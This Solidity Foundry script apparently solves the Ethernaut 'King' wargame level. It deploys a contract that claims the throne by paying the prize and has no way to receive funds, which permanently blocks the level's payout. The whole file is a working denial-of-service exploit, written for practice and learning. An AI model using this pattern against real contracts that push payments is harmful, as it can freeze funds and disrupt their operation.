// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    constructor(King king_) payable {
        address(king_).call{value: king_.prize()}("");
    }
}

contract KingSol is Script {
    King public king_ = King(payable(0xFd82296328FB14f8bDa71AfD5A2482CC53B48F7B));

    function run() external {
        vm.startBroadcast();

        console.log("Befor king: ", king_._king());
        new Ex{value: king_.prize()}(king_);
        console.log("After king: ", king_._king());

        vm.stopBroadcast();
    }
}